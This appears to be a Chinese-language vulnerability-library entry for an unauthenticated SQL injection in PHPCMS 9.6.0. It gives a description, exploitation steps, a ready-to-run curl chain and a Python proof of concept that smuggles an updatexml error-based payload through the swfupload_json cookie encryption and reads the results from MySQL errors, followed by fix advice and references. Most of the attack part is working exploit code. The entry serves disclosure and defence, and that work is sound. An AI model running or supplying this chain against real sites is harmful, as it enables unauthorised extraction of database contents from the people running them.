---
id: PHPCMS-9.6.0-WAP-SQLI
title: PHPCMS 9.6.0 前台 WAP/Content 模块 SQL 注入漏洞
product: phpcms
vendor: PHPCMS
version_affected: "9.6.0"
severity: HIGH
tags: [sqli, 无需认证, 报错注入, 国产]
fingerprint: ["PHPCMS", "phpcms", "/index.php?m=wap"]
---

## 漏洞描述

PHPCMS 9.6.0 `modules/content/down.php` 的 init 函数对 GET 参数 `a_k` 先经 `sys_auth()` 解密，再交给 `parse_str()` 解析，解析出的 `id` 未做过滤和类型校验直接拼接进 SQL。攻击者可通过 `modules/attachment/attachments.php` 的 `swfupload_json` 接口，把注入语句放入 `src` 参数（配合 `%*27` 绕过 `safe_replace`），经 JSON + Cookie 加密后作为 `a_k` 传入，实现前台无需登录的报错注入。

## 影响版本

- PHPCMS 9.6.0（后续版本对 `a_k` 过滤并将 `id` 做类型转换修复）

## 前置条件

- 无需认证
- 目标可访问前台（wap/attachment/content 模块存在）

## 利用步骤

1. GET 访问 `/index.php?m=wap&c=index&siteid=1`，记录 Set-Cookie 中 `_siteid` 结尾 Cookie 的值（用于 `userid_flash`）
2. POST 访问 `swfupload_json` 接口，携带上一步 Cookie，并把报错注入语句编码进 `src` 参数；响应 Set-Cookie 中的 `_att_json` Cookie 即为加密后的 SQL
3. GET 访问 `/index.php?m=content&c=down&a_k=<_att_json 值>`，页面回显 MySQL 报错信息

## Payload

```bash
# Step1: 获取身份 Cookie
curl -s -c cookies.txt "http://target/index.php?m=wap&c=index&siteid=1" -o /dev/null

# Step2: 构造注入（updatexml 报错注入，查询当前数据库用户）
USERID_FLASH=$(grep _siteid cookies.txt | awk '{print $NF}')
curl -s -b cookies.txt -c cookies.txt -d "userid_flash=${USERID_FLASH}" \
  "http://target/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26modelid%3D1%26catid%3D1%26f%3DTao" -o /dev/null

# Step3: 触发报错注入
ATT_JSON=$(grep _att_json cookies.txt | awk '{print $NF}')
curl -s "http://target/index.php?m=content&c=down&a_k=${ATT_JSON}" | grep -o "XPATH syntax error: '[^']*'"
```

```python
# Python PoC（与公开分析文章一致：step2 的 payload 需经 quote() 编码，避免 requests 二次转义破坏 % 与 &）
import re
import requests
from requests.utils import quote

url = "http://target"
# step1：获取身份 Cookie（userid_flash）
r1 = requests.get(url + "/index.php?m=wap&c=index&siteid=1")
userid_flash = r1.headers["Set-Cookie"].split("=")[1]
# step2：构造加密后的注入 Cookie（_att_json）
payload = '%*27 and updatexml(1,concat(1,(user())),1)%23&modelid=1&catid=1&m=1&f=Tao'
url_two = url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=" + quote(payload)
r2 = requests.post(url_two, data={"userid_flash": userid_flash})
att_json = next(c.value for c in r2.cookies if "_att_json" in c.name)
# step3：触发报错注入
r3 = requests.get(url + "/index.php?m=content&c=down&a_k=" + att_json)
print(re.findall(r"XPATH syntax error: '(.*?)'", r3.text))
```

## 验证方法

- Step3 响应中出现 `MySQL Error : XPATH syntax error: '...'`，其中包含注入查询结果（如数据库用户名）
- 可将 `user()` 替换为其他 SQL 语句继续探测

## 修复建议

1. 升级到 PHPCMS 修复版本（对 `a_k` 过滤、`id` 强制类型转换）
2. 对 `down.php` 的 `a_k` 解密结果做严格校验与参数化查询

## 参考

- 知道创宇云安全（yunaq）: https://www.yunaq.com/news/detail?id=5af511512eace22298f2adb0
- 腾讯云开发者社区 PHPCMS_V9.6.0 WAP 模块 SQL 注入漏洞分析: https://cloud.tencent.com/developer/article/1809914
- GitHub jiangsir404/PHP-code-audit（phpcmsv9.6.0-sqli）
